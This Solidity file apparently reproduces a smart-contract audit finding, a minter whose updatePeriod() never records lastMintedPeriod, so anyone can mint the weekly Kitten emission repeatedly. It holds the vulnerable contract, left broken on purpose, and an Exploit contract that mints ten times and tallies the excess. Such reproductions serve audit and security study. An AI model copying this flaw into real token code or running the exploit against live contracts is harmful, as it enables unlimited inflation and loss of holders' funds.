// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic reproduction of KittenSwap finding 58206 (C-02):
// "Lack of `lastMintedPeriod` update allows unlimited minting of Kitten".
//
// Source (Pashov Audit Group), Minter contract. `updatePeriod()` is reproduced
// VERBATIM (marked @> on the `if (currentPeriod > lastMintedPeriod)` gate).
//
// Root cause: `updatePeriod()` mints the weekly emission when
// `currentPeriod > lastMintedPeriod`, but NEVER updates `lastMintedPeriod`. So
// once the first period passes the condition is always true, and anyone can call
// `updatePeriod()` repeatedly to mint the emission again and again — an unlimited
// Kitten supply.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Faithful minimal Kitten token with mint + totalSupply.
contract Kitten {
    string public name = "Kitten";
    string public symbol = "KITTEN";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    address public minter;

    constructor() { minter = msg.sender; }
    function setMinter(address m) external { minter = m; }
    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "not minter");
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `updatePeriod()` is reproduced VERBATIM.
// ─────────────────────────────────────────────────────────────────────────────
contract Minter {
    Kitten public immutable kitten;
    address public immutable rebaseReward;
    address public immutable voter;

    uint256 public lastMintedPeriod;
    uint256 public constant WEEKLY_EMISSION = 100e18;
    uint256 public periodNow = 1; // one period has passed

    constructor(Kitten _kitten, address _rebaseReward, address _voter) {
        kitten = _kitten;
        rebaseReward = _rebaseReward;
        voter = _voter;
    }

    function getPeriod() public view returns (uint256) { return periodNow; }

    function updatePeriod() external {
        uint256 currentPeriod = getPeriod();
        if (currentPeriod > lastMintedPeriod) { // @> VULN: mints when currentPeriod > lastMintedPeriod but never sets lastMintedPeriod = currentPeriod, so this stays true forever and minting is unbounded
            kitten.mint(rebaseReward, WEEKLY_EMISSION);
            kitten.mint(voter, WEEKLY_EMISSION);
            // MISSING: lastMintedPeriod = currentPeriod;
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: call `updatePeriod()` 10 times in the same period and show the
// Kitten supply grows every call — an unbounded mint that should happen once.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant REBASE = address(0xBEEF);
    address internal constant VOTER = address(0xCAFE);
    uint256 internal constant CALLS = 10;
    uint256 internal constant PER_PERIOD = 2 * 100e18; // rebaseReward + voter each get WEEKLY_EMISSION

    Kitten public kitten; // child nonce 1
    Minter public vuln;   // child nonce 2 (VULN)

    uint256 public totalMinted;
    uint256 public excessMinted;

    constructor() {
        kitten = new Kitten();                          // nonce 1
        vuln = new Minter(kitten, REBASE, VOTER);       // nonce 2
        kitten.setMinter(address(vuln));
    }

    function run() external {
        for (uint256 i; i < CALLS; i++) {
            vuln.updatePeriod();
        }
        totalMinted = kitten.totalSupply();

        // harm: one period should mint exactly PER_PERIOD; instead it minted CALLS times
        require(totalMinted == CALLS * PER_PERIOD, "minting not unbounded");
        excessMinted = totalMinted - PER_PERIOD; // everything beyond the single legitimate period

        // Kitten IS the inflated/over-minted asset; record the excess to SINK
        kitten.setMinter(address(this));
        kitten.mint(SINK, excessMinted);
    }
}
